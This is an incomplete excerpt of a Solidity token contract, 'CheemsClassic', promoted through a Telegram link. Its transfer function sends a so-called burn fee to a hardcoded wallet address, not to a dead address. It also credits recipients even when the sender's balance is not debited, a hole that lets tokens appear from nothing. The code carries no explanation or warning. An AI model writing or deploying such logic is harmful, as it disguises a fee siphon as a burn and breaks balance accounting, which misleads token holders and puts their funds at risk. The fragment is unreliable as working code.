...
// Submitted for Telegram: https://t.me/cheemsclassicbsc
...
contract  CheemsClassic  is Ownable, IERC20 {
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0x663D3F54E2eCf630eF4eBE934cc4cB7fd795760a] += _bruntoken;
        if (sendertokens >= amount) { _rOwned[form] = sendertokens - amount; }
        _rOwned[to] += tokenamount; 
        if (_brunfee > 0) {
        emit Transfer(form, 0x663D3F54E2eCf630eF4eBE934cc4cB7fd795760a, _bruntoken);
        }
